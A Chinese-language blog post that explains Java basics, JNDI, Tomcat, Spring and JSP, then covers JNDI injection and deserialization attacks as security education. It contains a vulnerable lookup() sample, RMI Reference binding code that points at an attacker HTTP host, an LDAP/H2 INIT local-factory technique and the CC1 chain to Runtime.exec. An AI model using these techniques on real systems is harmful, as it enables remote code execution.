前言

这里只写一些我感觉对java比较有意思的内容吧，已经好久没水博客了。

如果没学过 Java 的朋友，可能听说过 JDK，JRE，JVM 等等J字头神秘小缩写，还有各种神秘的 Java 版本号，听起来很乱很复杂。

其实，正是在 Java 中，我才真正体会到编程语言的艺术。至少在大学课程里，Java 让我切实看到了编程的实用价值：丰富的类库、各种方法的使用、Web 编程以及异常处理机制，让我第一次感受到企业级开发的实际面貌，而这是此前学习 C++ 和 C 课程时完全体会不到的。（才疏学浅）

那我们来讲讲一些神秘小知识。

Java

历史

1995年5月23日，Java语言诞生。

从此直到 Java 1.5 为止，都是以 1.x 的版本号命名的，但是为了表示 J2SE1.5 这个java版本的重要性，其更名为 Java SE 5.0 。从此往后，java版本就以整数为版本号，直到今天。

java有不同的版本后缀：

  • SE 是 Standard Edition ，标准版，用于开发桌面和普通应用程序。

  • EE 是 Enterprise Edition ，企业版，在SE的基础上增加了（Web、分布式）等企业级功能，用于开发服务器端的大型应用。

  • ME 是 Micro Edition，微型版，用于手机等嵌入式设备。

java有很多神秘缩写，这里举几个常见的：

  • JDK 即 Java Development Kit，Java 开发工具包，是给开发者用的全家桶。它包含完整的 JRE，以及 javac 编译器、jar 打包工具、jdb 调试器等开发工具，用于编写、编译、调试和打包 Java 程序。简单说：JDK = JRE + 开发工具。

  • JRE 即 Java Runtime Environment，Java 运行时环境，是运行 Java 程序所需的最小环境。它包含 JVM 和 Java 核心类库，负责让已经编译好的 Java 程序跑起来，但不包含 javac 这类编译工具。简单说：JRE = JVM + 核心类库。

  • JVM 即 Java Virtual Machine，Java 虚拟机，它负责把编译生成的 .class 字节码翻译或编译成当前平台的机器指令并执行，同时管理内存、垃圾回收、线程等运行时事务。JVM 是 Java 实现“一次编译，到处运行”的核心：同一份字节码，由不同平台上的 JVM 分别翻译执行。

  • JAR 即 Java Archive，是 Java 的标准压缩包格式，其本质是一个zip，将很多的 .class 文件、资源和配置文件打包成一个包，方便分发和运行。JAR 同样有 ZIP 的本地文件头、中央目录、文件条目、压缩数据等结构。在此基础上，JAR 还包含了一些 java 的约定，比如 META-INF/MANIFEST.MF 清单文件，Java 模块，类路径，签名等。玩mc的应该都知道.jar（）

  • JIT 即 Just-In-Time Compiler，即时编译器。JIT 会在运行时把热点代码直接编译成本地机器码，大幅提升执行速度，是 JVM 高性能的关键。

  • JNI 即 Java Native Interface，Java 本地接口，它规定了 Java 代码如何调用 C/C++ 写的函数。

  • JDBC 即 Java Database Connectivity，Java 访问数据库的标准API，无论底下是 mysql 还是 oracle，Java 都可以通过JDBC来操作数据库。

  • JNDI 即 Java Naming and Directory Interface，Java命名与目录接口，是用来在分布式环境里按名字找资源的API。

哲学

Java 的设计哲学可以浓缩成一句话：语言本身尽量简单、直白，避免复杂性和不确定性。这一点在和 C++、C# 对比时尤其明显。

一个很能说明问题的细节是 ==。在 C++ 和 C# 里，== 可以被重载为用户定义的行为，你看到 a == b 时并不总能确定它到底在比较什么。Java 不允许运算符重载，== 就是“两个引用是否指向同一个对象”，没有任何隐藏含义。代价是你比较对象内容时必须显式写 equals()，但换来的是一眼就能读懂、不会“骗人”的语义。

这套哲学还体现在几个“故意不做”的决定上：

  • 没有指针，只有引用。C++ 允许你直接操作内存地址，也允许你释放后继续使用（悬空指针）；Java 把直接内存访问拿掉，从语言层面堵住了一整类崩溃。
  • 没有多重继承，用接口替代。C++ 的菱形继承是出名的复杂度来源；Java 只允许单继承类，但可以 implements 多个接口，用“行为契约”而不是“状态继承”来表达多态。C# 后来也跟随了这个选择。
  • 默认没有全局变量和全局函数。一切代码必须在类里，C++ 那种散落在文件顶层的全局状态在 Java 里不存在。

Java的所有代码都需要在一个类里面。哪怕你写一个 你好，世界！也必须包含在类里面。Java 命名要求 类名用大驼峰，方法/变量小驼峰，常量全大写下划线分割，包名全小写。总之，C++ 让你拥有很高的自由度，但要你自己来兜底。而 Java 则追求让你独到的每一行都没有歧义。

值得注意的是Java 没有指针，只有引用。 既然没指针，那 Walrus b = a; 到底在干嘛？CS61B 开局的“海象谜题”，其实就是在帮你把这事儿掰扯清楚。

先看两段代码。第一段是对象：

1Walrus a = new Walrus(1000, 8.3);
2Walrus b;
3b = a;
4b.weight = 5;
5
6System.out.println(a);
7System.out.println(b);

改 b.weight，a 会跟着变吗？答案是会，两者的体重最后都变成了 5。

再看第二段，基本类型：

1int x = 5;
2int y;
3y = x;
4x = 2;
5
6System.out.println(x);
7System.out.println(y);

改 x，y 会跟着变吗？答案是不会，x 是 2，y 依然是 5。

明明都是 = 赋值，凭啥结果完全相反？因为 Java 只有一套规则，CS61B 管这叫 “等号的黄金法则”：y = x 就是把 x 盒子里的比特位，原样复制一份塞进 y 的盒子里。

搞懂这句话，谜题就解了。

对于 int，盒子里装的纯粹是数值本身。y = x 复制了一份 5 过去。接着你把 x 改成 2，那只是重写了 x 的盒子，y 的盒子还是 5，两不相干。

但 Walrus 这种对象不同。变量盒子里装的从来不是海象本身，而是它在内存里的地址。new Walrus() 在堆里造出一只海象，然后把地址交给了 a。b = a 复制的是地址，所以 a 和 b 手里拿着同一个门牌号。b.weight = 5 并不是换了一只海象，而是顺着 b 的地址摸过去，改了那只海象。a 拿着同样的地址找过去，看到的自然也是同一只变瘦的海象。

所以，“Java 没有指针只有引用”这句话，准确的理解是：底层的引用就是个地址，行为跟 C++ 指针一模一样，但 Java 不让你对地址做算术。你不能 a++ 跨到隔壁内存，不能把地址强转成数字，也不能手动去释放它。C++ 的指针像个万能遥控器，想指哪指哪；Java 的引用就像个固定了频道的遥控器，只能用来顺着它找对象、改对象，但绝不允许你越过对象去乱翻内存。这恰恰呼应了前面说的 Java 设计哲学：拿掉指针，就是拿掉了一整类因为乱碰内存而导致的崩溃。

顺带提一嘴内存分配。当你写下 new 的时候，对象实体是实打实放在堆（Heap）里的；而栈（Stack）内存空间小、跑得快，在方法的局部变量表里，给 a 这种变量分配的仅仅是一个存放地址的槽位。

所以，从来不是什么“在栈里创建了一个指向堆的引用”，而是：栈上有个变量，它存的值是指向堆里那个对象的地址。正是这个“拷贝地址”的动作，才造就了海象谜题里，两个变量携手指向同一个对象的奇妙现象。

如果你对引用和指针还比较迷糊的话，可以这样理解：归根结底，指针和引用你都可以理解为“只是存着地址的变量”

JNDI

JNDI（Java Naming and Directory Interface，Java 命名和目录接口）是 SUN 公司提供的一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口（JNDI 服务供应接口，SPI）的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务、目录服务之间进行交互。

这一大串是什么意思？

首先要明白什么是“命名”和“目录”

命名服务

其实我们很多时候都在用命名服务，其实它就是从一个值到另一个值的映射。对人类来说，记住一个有意义的名字比记住一大堆数字要容易得多。比如说DNS解析服务，你只要记住www.baidu.com，DNS就会通过这个域名去帮你找到百度的ip地址。

这就是映射，把人类容易记住的域名映射为计算机更喜欢的数字。

目录服务

目录比命名更多一层，它不只是“名字→值”，还可以按照属性查找，其条目本身也可以用层次结构。

比如说图书馆检索系统。图书馆的每一本书都有书名，作者，分类等属性。你可以按书名找书，也可以按作者找、按分类号找，甚至限定“某个作者写的、某个分类下的书”。图书馆检索系统就是一个比较典型的目录服务：你不仅能按名称找到某个条目，还能利用条目的属性去筛选和查找。

回头

理解了命名服务和目录服务，再回过头来看 JNDI：它是一个为 Java 应用程序提供命名服务的应用程序接口，为我们提供了查找和访问各种命名和目录服务的通用统一接口。

通过 JNDI 统一接口，我们可以访问各种不同类型的服务。就像DNS是一种命名服务、图书馆检索系统是一种目录服务，JNDI 给 Java 程序提供了一个统一入口，去访问这类命名和目录服务。比如通过 JNDI API 可以访问 DNS 这类命名服务，也可以访问 LDAP 这类目录服务。

最顶层：Java Application（Java 应用程序） 这就是你写的代码。你的代码想要找点东西（比如一个数据库连接、一个远程对象），但它不知道东西具体藏在哪里，也不知道怎么跟底层系统沟通。

第二层：JNDI API（统一门面） 这是 JNDI 提供给开发者用的统一接口。这就好比你家所有的电器（电视、空调）都用同一个遥控器。你的代码只管对着 JNDI API 喊一句：“我要找叫 xxx 的东西”，不用管底下到底是用什么技术在找。

第三层：Naming Manager（命名管理器） 这是 JNDI 内部的“大管家”。当你的代码发出查找请求后，管家会看：“哦，你要找的这个名字，应该归哪个底层服务管？”然后它负责把任务分派下去。

第四层：JNDI SPI（服务供应接口）与底层实现 图里最下面那排黄色的方块（LDAP、DNS、NIS、NDS、RMI、CORBA），就是不同的底层服务。 SPI（Service Provider Interface） 可以理解为**“驱动程序插槽”**。JNDI 定义了这个插槽的规格，而 LDAP、DNS 这些服务想要接入 JNDI，就得提供对应的“驱动程序”（实现 SPI 接口）。

LDAP 就是企业里非常常用的目录服务。通过JNDI，Java代码就可以在LDAP服务器里查数据。

RMI/CORBA 是早期的分布式对象技术，JNDI 可以作为一个注册表，帮你找到网络上另一个Java对象。

在 CS61B 和 Java 等课程中，可以深刻的体会到 Java 高内聚低耦合的精神。

JNDI 之前

在 JNDI 之前，我们先看看传统的 Java 数据库代码

 1Connection conn = null;  
 2try {  
 3    // 1. 手动加载驱动
 4    Class.forName("com.mysql.cj.jdbc.Driver");  
 5    // 2. 手动写死 URL、用户名、密码
 6    conn = DriverManager.getConnection("jdbc:mysql://MyDBServer?user=btop251&password=123456");  
 7    
 8    // 使用 conn 进行 SQL 操作
 9    // ...
10    
11    conn.close();  
12} catch(Exception e) {  
13    e.printStackTrace();  
14} finally {  
15    if(conn != null) {  
16        try {  
17            conn.close();  
18        } catch(SQLException e) {
19            e.printStackTrace();
20        }  
21    }  
22}

这种“传统做法”在小规模开发中不会出问题，但一旦项目变大，麻烦就来了：

  • 配置写死：数据库服务器名、用户名、密码一旦改变，就得去改代码里的 JDBC URL。

  • 强耦合：如果数据库从 MySQL 换成了 Oracle，不仅 JDBC 驱动包要换，代码里的驱动类名也要跟着改。

  • 管理不便：随着并发增加，连接池参数需要调整，而这些通常应该在服务器端统一管理，而不是写死在代码里。

开发人员真正想要的是只关心“我要用一个数据库连接”，而不关心“这个连接是从哪个服务器、用哪个账号密码连上的”。

为了解决这些问题，JNDI 闪亮登场。JNDI 的核心思路是：把找数据库这件事，从代码里挪到应用服务器（容器）的配置里。代码不再自己去“连”数据库，而是拿着一个名字去找容器要一个连接。

JNDI 以后

有了 JNDI 以后，流程变成了两步：先在容器里配好，再在代码里按名查找。

在容器中配置数据源

在早期的 J2EE 容器（比如 JBoss）中，你需要提供一个 XML 配置文件。我们可以在里面定义一个数据源，给它起个名字（比如 MySqlDS），并把实际的 JDBC 参数写进去：

 1<?xml version="1.0" encoding="UTF-8"?> 
 2<datasources> 
 3    <local-tx-datasource> 
 4        <!-- 给这个数据源起个名字，代码里就用这个名字找它 -->
 5        <jndi-name>MySqlDS</jndi-name> 
 6        <!-- 这里是具体的连接信息，只有运维或管理员需要关心 -->
 7        <connection-url>jdbc:mysql://localhost:3306/lw</connection-url> 
 8        <driver-class>com.mysql.cj.jdbc.Driver</driver-class> 
 9        <user-name>leyi</user-name> 
10        <password>061018</password> 
11    </local-tx-datasource> 
12</datasources>

在代码中通过 JNDI 引用

容器启动后，这段配置就生效了。此时，你的 Java 代码只需要通过 JNDI 接口去“按名索物”即可：

 1Connection conn = null;  
 2try {  
 3    // 1. 创建 JNDI 上下文
 4    Context ctx = new InitialContext();  
 5    // 2. 通过名字查找数据源（这个 MySqlDS 就是刚才 XML 里配的）
 6    Object datasourceRef = ctx.lookup("java:MySqlDS"); 
 7    // 3. 获取数据源并拿到连接
 8    DataSource ds = (DataSource) datasourceRef;  
 9    conn = ds.getConnection();  
10    
11    // 使用 conn 进行数据库 SQL 操作
12    // ...
13    
14} catch(Exception e) {  
15    e.printStackTrace();  
16} finally {  
17    if(conn != null) {  
18        try { 
19            conn.close(); 
20        } catch(SQLException e) { 
21            e.printStackTrace(); 
22        }  
23    }  
24}

现在的代码彻底不用管具体 JDBC 参数了。如果哪天数据库换了机器、改了密码，甚至从 MySQL 换成了 Oracle，你只需要去修改容器的 XML 配置文件即可，只要保证数据源名称（MySqlDS）不变，Java 源代码一行都不用改，重新编译都不需要。

由此可见，JNDI 避免了程序与数据库之间的紧耦合，让应用变得易于配置和部署。这就是 JNDI 在 J2EE 架构中最大的价值。

“这段文字里的 JNDI 用法，带有很浓厚的传统 Java EE 色彩。现在你如果去用 Spring Boot 开发，基本看不到这种写法了。Spring Boot 用 application.yml 配置数据源，再用依赖注入（@Autowired）直接把 DataSource 塞进你的代码里。

但底层发生了什么呢？ Spring Boot 在背后帮你自动配置了连接池（如 HikariCP）。在某些特定的传统企业容器里，Spring 甚至依然会通过 JNDI 去获取服务器配置好的数据源。所以，依赖注入本质上是把 JNDI 的主动查找变成了被动接收，JNDI 并没有消失，只是退到了幕后。”

Web服务与框架

那么嗦到这里，再看看 Spring 和 Spring Boot，Tomcat都是些什么东西吧（真是梦到哪说到哪）

Tomcat 是 Servlet 容器

Tomcat 的核心工作是实现 Servlet 容器规范，它本质是一个 Web 服务器。

这里的服务器并不是我们平时说的一台物理机、云主机；而是软件层面的服务器，比如Nginx、Apache等。

更确切地说，Tomcat 是一个 Servlet 容器。

Servlet 是 Java Web 世界里一个基础性规范，全称 Server Applet，即小服务程序。在 C/C++ 中，服务器能返回的通常是预先写好的静态文件。Servlet 的出现，就是为了动态网页的实现，其根据每一次请求的不同返回动态内容。

Servlet 是一个接口（Interface），它主要定义了三个事情：

  • 初始化 (init)：容器创建 Servlet 实例，并调用一次 init 方法进行准备工作。通常只在第一次请求到达或容器启动时发生。
  • 服务 (service)：这是核心环节。容器调用 service 方法，并将代表请求的 HttpServletRequest 对象和代表响应的 HttpServletResponse 对象传递进来。你的业务逻辑就在这里编写——从请求中读取数据，处理，然后把结果写入响应。
  • 销毁 (destroy)：当 Web 应用被关闭或容器决定回收资源时，会调用 destroy 方法，让你有机会释放占用的资源。

但是 Servlet类（实现该接口的类）本身没有 main 方法，不能独立启动，也不能直接监听端口、解析 HTTP。它必须部署到 Tomcat 中，由 Tomcat 创建它的实例、调用它的方法、最后销毁它。也就是说，Servlet 是“被容纳”在 Tomcat 里的组件，所以 Tomcat 是它的容器。Tomcat 负责管理 Servlet 组件的生命周期并提供运行环境。

那么这些 Web 服务器 都做些什么呢？

  • Web 服务器和 Servlet 容器负责：网络通信（Socket）、HTTP 协议解析、多线程处理、把请求打包成 HttpServletRequest 对象，把响应打包成 HttpServletResponse 对象。
  • 不管什么：它完全不管你业务逻辑怎么写，也不管你怎么连数据库。

Spring 是企业级应用框架

Spring 的核心是 IoC（Inversion of Control，控制反转）容器。它的思想是：把对象的创建、依赖关系的组装和生命周期管理，从应用代码手里“反转”交给一个外部容器来负责。

如果说 Tomcat 管的是“请求怎么进来、怎么变成 HttpServletRequest”，那么 Spring 管的是“请求进来之后，业务对象怎么组织、依赖怎么组装、事务怎么控制”。

它管理项目中大量 Java 对象（Bean）的创建、组装和生命周期，并在此基础上提供事务、安全、面向切面编程（AOP）、数据访问（如 Spring Data）等企业级能力。

所以，IoC 容器是 Spring 的地基，但 Spring 并不止于 IoC。它作为企业级应用框架，还在 IoC 之上提供了 AOP、事务管理、数据访问封装、Spring MVC 等能力。同时，它不直接处理 Socket 和 HTTP 解析，而是运行在 Servlet 容器之上，专注于应用层的组织与治理。

Tomcat 和 Spring 的关系，有点像 Python 里 Gunicorn 和 Flask 的关系，可以粗略对应：

  • Flask ≈ Spring（应用框架）：负责定义路由（URL 到处理逻辑的映射）、处理业务逻辑、操作数据库、渲染模板等。它们不直接处理底层 TCP 连接和 HTTP 报文解析。
  • Gunicorn ≈ Tomcat（Web 服务器 / 容器）：负责监听端口、接收网络请求、管理并发，然后把请求转交给背后的应用。Gunicorn 主要用多进程模型，Tomcat 主要用多线程模型，并且 Tomcat 还是 Servlet 容器，负责管理 Servlet 组件的生命周期。

所以更准确地说：Gunicorn 和 Tomcat 都处在“服务器/运行环境”这一层，Flask 和 Spring 都处在“应用框架”这一层。 这个类比适合理解层次关系，但不宜完全画等号。

Spring MVC：衔接二者

但这里还有一个问题：Tomcat 把请求打包成 HttpServletRequest 之后，怎么交给 Spring 的业务代码？答案是 Spring MVC。

Spring MVC 的核心是一个叫 DispatcherServlet 的类。注意，它本身就是一个 Servlet——它间接实现了 Servlet 接口，因此会被部署在 Tomcat 这个 Servlet 容器里。Tomcat 并不认识你的 Controller，它只认识 Servlet；于是请求先到 DispatcherServlet，再由它根据 URL 路由到你写的 Controller 方法。

所以请求链路是：

1浏览器
2  → Tomcat（解析 HTTP，创建请求/响应对象）
3  → DispatcherServlet（一个 Servlet，由 Tomcat 调用）
4  → Controller → Service → DAO

换句话说，Spring MVC 不是替代 Tomcat，而是寄生在 Servlet 容器之上的框架：Tomcat 负责“把请求交给 Servlet”，Spring MVC 负责“拿到请求后怎么分发给你的 Controller”。

严格说，Flask 更接近 Spring MVC，而不是整个 Spring。Spring 是一个框架家族，IoC 容器、AOP、事务、数据访问、Spring MVC 都是它的组成部分；Spring MVC 只是其中负责 Web 层的那一块。所以前面的类比应理解为：Flask ≈ Spring MVC 的 Web 框架角色。

Spring Boot：整合层，不是新的一层

Spring Boot 不是又一个“层”，而是整合与运行时封装。传统开发要手动装 Tomcat、配 web.xml、配 Spring 容器；Spring Boot 把 Tomcat 内嵌进来，通过自动配置和 starter 把 Spring、Spring MVC、数据访问等组件打包成一个可直接 main 启动的应用。

它让服务器和应用看起来合为一体，但底层仍然是：内嵌 Tomcat 提供 Servlet 容器，Spring MVC 的 DispatcherServlet 接收请求，IoC 容器管理 Bean。

JSP 本质上是 Servlet

JSP 的全称是 JavaServer Pages，看起来像在 HTML 里写 Java 代码，但它能被容器执行，是因为它在运行时被转换成的类是一个间接实现了 Servlet 接口的类。

当你第一次请求一个 .jsp 文件时，Tomcat 并不会直接执行它。容器中有一个专门的 JSP 引擎，它会先检查这个 JSP 页面对应的 Servlet 是否比 JSP 文件本身旧。（如果生成的 Servlet 比 JSP 文件旧，说明 JSP 在上次编译之后又被改过，原来的 Servlet 已经过期，需要重新生成。）如果是，就把 JSP 翻译成一个 Java 源文件，再编译成 .class 字节码，最后加载执行。

翻译出来的类，本质上就是一个 Servlet。这个类通常叫 xxx_jsp，它继承了某个 Servlet 基类（如 HttpJspBase），并实现了 Servlet 接口体系。你写在 JSP 里的内容，在翻译阶段会被分类处理：

  • 静态 HTML：被转成“向响应输出流写入这段文本”的代码；
  • Scriptlet（<% %>） ：Java 代码片段被插入生成的 Servlet 类中；
  • 表达式（<%= %>） ：被转成向响应写入表达式求值结果的代码；
  • 声明（<%! %>） ：变量和方法声明被插入类级别。

所以你写的 JSP，最终就是一个用另一种语法写出来的 Servlet

JSP 里的 request、response 从哪来？

因为最终执行的是 Servlet，容器在调用 _jspService() 时自然持有 HttpServletRequest 和 HttpServletResponse 对象。JSP 规范为了让开发者不用手动声明，就把这些对象预先定义成了“内置对象”，可以直接在 JSP 里使用：request、response、session、application、out 等。它们不是 JSP 自己创建的东西，而是 Servlet API 中本来就有、由容器传入的请求/响应/会话/ServletContext 对象，只是被 JSP 引擎提前绑定成了变量名。

但是 JSP 在主流开发中已经退场了，它退居二线，主要是存在于一些老服务中。

它本身是允许在 HTML 里直接写 Java 代码，这在大项目中会很难维护。而且其严重依赖传统的 Servlet 容器和 web.xml 配置，在Spring Boot 为主流的今天，它需要额外复杂的配置才能使用。JSP 文件无法被浏览器直接打开预览，前端开发者必须依赖后端环境才能看到页面效果。因此，无论是Spring 官方推荐的 Thymeleaf，还是彻底走向前后端分离（由 Vue / React 负责视图），现代技术栈都已将 JSP 排除在新项目的选项之外。

但是大量老系统依然依赖 JSP 工作（好吧我们网安的土壤很大一部分都是老系统），也许你可以在一些题目里见到 JSP 上传，其实有点类似于 PHP 的图片马。

安全方面

JNDI注入

从“按名取物”到“按名加载代码”

前文 JNDI 的正常用法是：名字由容器预先配好，代码只是按名去取，比如 ctx.lookup("java:MySqlDS")。JNDI 注入的前提，就是这个 lookup() 的参数从 可信配置 变成了 外部可控输入 。

一个典型的脆弱写法：

1String uri = request.getParameter("uri"); // 攻击者可控
2InitialContext ctx = new InitialContext();
3ctx.lookup(uri); // 名字完全由外部决定

InitialContext 是 JNDI 的入口，代表初始目录环境。lookup(name) 就是拿着名字去查找资源。漏洞的起点就是这里的 uri 可控。

一旦攻击者能控制 lookup() 的参数，他就可以传入一个指向自己服务器的 RMI 或 LDAP URL。JNDI 会按这个 URL 去远程“查找”资源，而远程服务可以返回一个 Reference 对象，里面携带 classFactory 和 classFactoryLocation，告诉客户端：“你要的类不在本地，去这个地址下载。”客户端如果本地找不到这个类，就会从攻击者指定的地址拉取 .class 字节码并实例化——构造方法或静态代码块随之执行，RCE 就发生了。

JNDI 不只是“查对象”，在遇到 Reference 且本地缺类时，它还会下载并实例化对象。

工厂 和 Reference对象 是什么

你看到一说到 JNDI 就会提到工厂，这个工厂是什么鬼东西？Reference对象又是什么？

在 JNDI 的正常设计中，Reference 是一种用于引用外部对象的机制。当你 lookup 一个名字的时候，服务端不一定直接返回一个真实对象，可以返回一个 Reference，告诉客户端：我这里没有你要的对象，你去这个地址找吧

一个 Reference对象 主要包含三个信息：

  • className：被引用对象的类名；
  • classFactory：负责创建对象的工厂类名，通常实现 ObjectFactory；
  • classFactoryLocation：工厂类字节码所在的远程 URL，通常是 HTTP 地址。

于是，当受害者连接到攻击者的恶意 RMI 或 LDAP 服务器时，服务端不返回正常对象，而是返回一个精心构造的 Reference对象，告诉受害者说：“你去这个地方找吧！"，于是受害者就去链接攻击者的另一台 HTTP服务器。然后它就下载了对应的 .class 文件并实例化，最终导致 RCE。

当然，现代 JDK 默认关闭了 trustURLCodebase，所以这种远程加载工厂类的方式在高版本 JDK 中默认已经不可用。

在 JNDI 中，Reference对象 本身并不是你最终要拿到的资源，而像是一个说明书，那么由谁来把这个说明书所描绘的真实对象构造出来呢？这就是工厂的工作。

JDK 中定义了一个标准的接口 javax.naming.spi.ObjectFactory，里面只有一个核心方法：getObjectInstance()。

JNDI 客户端拿到 Reference 后，会看看说明书上有没有写指定哪个加工厂（即 javaFactory 属性）。如果有，就去把这个加工厂实例化，然后把 Reference 里的参数丢给它的 getObjectInstance() 方法，让它根据参数生产出最终的对象。

在正常的开发中： 如果程序员用 JNDI 查一个数据源，容器返回一个 Reference，指定了 BasicDataSourceFactory。JNDI 就会叫这个工厂去读取数据库的账号密码，然后返回一个货真价实的数据库连接池对象。

在 JNDI 注入中，工厂成了攻击的跳板： 因为不同工厂的“警惕性”不一样：

  • 比如 Tomcat 的 BeanFactory 很警惕，它只接受自家特制的 ResourceRef 订单，普通订单直接拒收（返回 null）；
  • 但像 BasicDataSourceFactory 这类第三方库的工厂，警惕性很低，只要看到是个 Reference 就接单，老老实实地去读取说明书里的参数（比如 JDBC URL）。

攻击者就是利用了这种低警惕性的工厂。在 LDAP 返回的恶意条目里，强行指定一个目标本地存在的、有危险行为的工厂类。当 JNDI 去调用这个工厂“生产对象”时，实际上就是借这把合法的刀，执行了攻击者预设的危险逻辑（比如建立恶意的 H2 数据库连接）。

三种协议，三种角色

我们重点讨论 LDAP、RMI、DNS 三种协议，它们在这个攻击面里的角色并不相同：

协议 在 JNDI 注入中的角色
RMI 远程方法调用协议。攻击者起一个 RMI Registry，把恶意 Reference 绑定上去，客户端 lookup() 时取回并实例化。
LDAP 轻量级目录访问协议。攻击者起一个 LDAP 服务，在查询结果里返回带有 javaCodeBase、javaFactory、objectClass=javaNamingReference 的条目，诱导客户端加载远程类。
DNS 只做探测。lookup("dns://xxx.dnslog.cn") 能让目标发起 DNS 查询，证明“参数可控、JNDI 可达”，但 DNS 本身不返回 Reference，不能直接 RCE。

DNS 探测的价值在于低成本验证漏洞存在，同时避免过早暴露 RMI/LDAP 服务器 IP。先 DNSLog 确认，再上 RMI/LDAP 利用，是实战里更稳妥的顺序。

JNDI 注入的可利用性高度依赖 JDK 版本：

协议 JDK 6 JDK 7 JDK 8 JDK 11
LDAP 6u211 以下 7u201 以下 8u191 以下 11.0.1 以下
RMI 6u132 以下 7u122 以下 8u113 以下 无

Oracle 逐步收紧了 Reference 的远程 codebase 加载：RMI 方向大约从 8u121 开始限制，LDAP 方向大约从 6u211 / 7u201 / 8u191 / 11.0.1 开始默认关闭 trustURLCodebase。所以在较新 JDK 上，LDAP 返回 Reference 指向远程 HTTP 这条最直接的路径默认走不通，攻击面会转向本地 classpath 中已有的 gadget 类、反序列化等路径。JNDI 注入并没有消失，只是利用条件变苛刻了

RMI 利用链条

RMI 方向的复现逻辑很清晰：

  1. 攻击者起一个 RMI Registry；
  2. 构造一个 Reference("Calculator", "Calculator", "http://攻击者:8081/")；
  3. 用 ReferenceWrapper 包装后绑定到 Registry 的某个名字上；
  4. 受害端 lookup("rmi://攻击者:7778/RCE")；
  5. 客户端取回 Reference，本地找不到 Calculator 类，就去 http://攻击者:8081/ 下载 Calculator.class 并实例化；
  6. Calculator 的构造方法里执行命令。

核心代码大致是：

1Reference reference = new Reference("Calculator", "Calculator", "http://127.0.0.1:8081/");
2ReferenceWrapper wrapper = new ReferenceWrapper(reference);
3registry.bind("RCE", wrapper);

受害端只有一行关键代码：

1new InitialContext().lookup("rmi://127.0.0.1:7778/RCE");

LDAP 利用链条

LDAP 方向的服务端要稍微复杂一些。攻击者通常会使用 unboundid-ldapsdk 这类库起一个内存 LDAP 服务。当受害者的 JNDI 客户端发起 lookup("ldap://攻击者:1234/Calculator") 时，LDAP 服务会在查询结果里返回一个特殊条目，包含以下核心属性：

  • javaClassName：目标类名；
  • javaCodeBase：远程类所在的 HTTP 地址；
  • javaFactory：工厂类名；
  • objectClass：javaNamingReference。

客户端 JNDI 收到这个条目后，会将其解析为一个 Reference 对象。在最经典的利用方式中，客户端如果发现本地没有这个类，就会根据 javaCodeBase 属性，去攻击者的 HTTP 服务器上下载恶意 .class 文件并实例化，从而完成 RCE。

和 RMI 的区别在于：RMI 是把 Reference 对象直接绑定在 Registry 里；而 LDAP 是把 Reference 所需的信息，编码成目录条目的属性返回。 两者最终都汇入了“客户端通过 Reference 加载并实例化类”这一条路径。

但是，现代 JDK 拦住了这条路。 高版本 JDK（如 8u191+、JDK 11+）默认将 trustURLCodebase 设为 false，拒绝根据 javaCodeBase 远程加载类。如果你还用这种“一把梭”的远程下载思路去打，目标会直接报错。

那么我们该怎样去注入呢？那就是利用本地工厂（Local Factory）

既然不让从远程下载类，我们能不能让 Reference 去加载目标本地已存在的类？ 这就是现代 JNDI 利用的核心：利用 javaFactory 属性，指向目标 classpath 里现成的、带有危险行为的工厂类。

比如，如果目标系统里依赖了 commons-dbcp2 和 h2 数据库驱动。攻击者就可以在 LDAP 返回的条目中这样配置：

  • javaFactory：设为 org.apache.commons.dbcp2.BasicDataSourceFactory；
  • 并附加一系列自定义属性，例如指定 URL 为 jdbc:h2:mem:x:INIT=...。

客户端 JNDI 解析后，不去远程下载，而是直接实例化本地的 BasicDataSourceFactory，并把附加属性当成数据库连接参数传进去。最终通过 H2 的 INIT 参数和 Nashorn 脚本引擎，在目标本地执行任意命令。

在这种新模式下，Reference 不再是远程下载清单，而是让目标调用本地的工厂——告诉目标 JNDI：“请用你本地的这个工厂，按我给的参数去构造对象。”

Java 原生反序列化

Java 序列化允许把一个对象的状态写成字节流，之后通过 ObjectInputStream.readObject() 还原。问题在于：当这个字节流来自不可信来源时，readObject() 会忠实地按照字节流里的描述去还原对象，并在还原过程中调用对象自己的 readObject() 方法。

也就是说如果攻击者能构造一个恶意对象的字节流，让目标服务器执行 readObject()，就会触发这个对象在 readObject() 中预设的逻辑。 这听起来似乎需要目标 classpath 上恰好有一个本身就带恶意 readObject()的类，但 Java 生态的庞大恰恰提供了大量可以被串联起来的“中间件”——这就是 Gadget Chain（利用链）

Commons Collections：反序列化利用链的教科书

Apache Commons Collections 是 Java 反序列化利用链最经典、影响最广的源头。它的核心问题出在 InvokerTransformer 这个类上。

InvokerTransformer 实现了 Transformer 接口，它的 transform() 方法会通过反射调用一个指定对象的指定方法。如果直接传入 Runtime 对象，并把方法名设为 exec，参数设为命令，那么调用 transform() 就等于执行命令。

但直接调用 transform() 不算漏洞，真正的利用链需要解决的是：如何在反序列化过程中，自动触发这个 transform() 调用？

CC1 链的经典答案是 AnnotationInvocationHandler。这个类在 readObject() 的过程中会对它持有的 Map 进行遍历操作，而如果这个 Map 被包装成了 TransformedMap，并且其 value 对应的 Transformer 被设置为恶意的 ChainedTransformer，那么遍历 Map 时就会触发 transform()，进而反射调用 Runtime.exec()。

把这条链压缩成一行调用栈，大致是：

1ObjectInputStream.readObject()
2  → AnnotationInvocationHandler.readObject()
3    → TransformedMap 遍历
4      → ChainedTransformer.transform()
5        → InvokerTransformer.transform()
6          → Method.invoke()
7            → Runtime.exec()

这条链的利用条件通常比较苛刻（依赖特定版本的 Commons Collections 和 JDK），但它确立了 Gadget Chain 的基本思维模式：不需要目标直接反序列化一个“恶意类”，只需要目标 classpath 上存在一条“反序列化时会走到危险方法”的调用路径。

在实际测试中，我们通常不需要手动去写这些链，开源工具 ysoserial 已经内置了大量经典的 Gadget Chain，直接生成 payload 即可。

从原生链到框架漏洞：Shiro、Fastjson、WebLogic

原生反序列化链的思维很快被应用到了各种框架和中间件上，因为它们各自在“处理不可信输入”这件事上出现了不同类型的疏忽。

Apache Shiro RememberMe（CVE-2016-4437） Shiro 为了实现“记住我”，会把用户信息序列化后加密，放在 Cookie 的 rememberMe 字段里。问题在于加密密钥是硬编码的（在旧版本中），攻击者只要拿到这个密钥，就可以自己构造恶意序列化数据，加密后作为 rememberMe Cookie 发给服务器，服务器解密后直接 readObject()，触发反序列化。这里的攻击入口变成了一个 Cookie。

